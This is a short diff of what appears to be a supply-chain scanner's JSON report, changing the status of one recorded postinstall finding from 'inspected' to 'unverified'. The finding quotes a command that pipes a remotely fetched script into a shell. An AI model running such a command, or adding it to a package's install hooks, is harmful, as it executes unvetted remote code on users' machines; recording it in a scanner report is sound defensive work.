@@ -71,7 +71,7 @@
       "location": "{root}/package.json#scripts.postinstall",
       "raw": "curl https://example.invalid/setup.sh | sh",
       "provenance": "manifest",
-      "disposition": "inspected"
+      "disposition": "unverified"
     }
   ],
   "heuristics": [
